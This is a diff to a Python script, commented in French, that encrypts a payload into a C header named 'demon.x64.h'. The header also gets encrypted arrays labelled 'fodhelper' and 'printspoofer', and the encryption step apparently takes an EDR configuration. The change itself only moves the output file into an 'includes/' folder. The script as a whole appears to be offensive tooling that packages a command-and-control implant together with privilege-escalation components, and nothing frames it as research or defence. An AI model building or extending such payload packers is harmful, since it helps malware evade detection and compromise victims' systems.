@@ -118,7 +118,7 @@ def encrypt_with_seed(input_file, output_file, edr_config_file=None):
             f.write(final_payload)
         print(f"[+] Payload écrit dans {output_file}")
     else:
-        print("[*] Pas de fichier output, demon.x64.h créé uniquement")
+        print("[*] Pas de fichier output, includes/demon.x64.h créé uniquement")
 
     payload_array = format_c_array(final_payload)
     fod_array = format_c_array(fodhelper_enc)
@@ -159,11 +159,11 @@ static const size_t fodhelper_enc_len = {len(fodhelper_enc)};
 #endif
 """
 
-    with open("demon.x64.h", 'w') as f:
+    with open("includes/demon.x64.h", 'w') as f:
         f.write(header_content)
 
     print("")
-    print(f"[+] demon.x64.h généré")
+    print(f"[+] includes/demon.x64.h généré")
     return True, seed, key, iv
 
 def encrypt_dll(dll_file, seed, key, iv):
@@ -206,14 +206,14 @@ if __name__ == "__main__":
         if dll_enc:
             dll_array = format_c_array(dll_enc)
             
-            # Append au fichier demon.x64.h
+            # Append au fichier includes/demon.x64.h
             dll_declaration = f"\nstatic unsigned char printspoofer_enc[] = {{\n{dll_array}\n}};\n"
             dll_declaration += f"static const size_t printspoofer_enc_len = {len(dll_enc)};\n"
             
-            with open("demon.x64.h", 'a') as f:
+            with open("includes/demon.x64.h", 'a') as f:
                 f.write(dll_declaration)
             
-            print(f"[+] printspoofer_enc ajoutée à demon.x64.h")
+            print(f"[+] printspoofer_enc ajoutée à includes/demon.x64.h")
     
     exit(0 if success else 1)
 
